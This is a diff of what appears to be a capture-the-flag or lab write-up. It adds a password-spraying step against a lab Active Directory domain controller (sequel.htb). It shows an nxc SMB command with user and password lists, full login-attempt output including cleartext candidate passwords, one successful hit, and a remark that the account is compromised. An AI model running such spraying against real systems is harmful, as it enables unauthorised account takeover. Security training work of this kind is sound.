@@ -249,5 +249,51 @@ SMB         10.129.232.128  445    DC01             Forced Log off Time: Not Set
 There is no account lockout set in this case so i can spray safely
 
 ```python
-
+nxc smb dc01.sequel.htb -u users.txt -p passwords.txt --continue-on-success
+SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Administrator:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Guest:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\krbtgt:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\DC01$:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\michael:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Administrator:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Guest:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\krbtgt:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\DC01$:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\michael:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sql_svc:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\rose:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Administrator:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Guest:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\krbtgt:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\DC01$:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\michael:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\rose:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Administrator:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\Guest:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\krbtgt:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\DC01$:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\michael:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\rose:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.232.128  445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE
 ```
+
+I have now compromised the user `oscar`
+
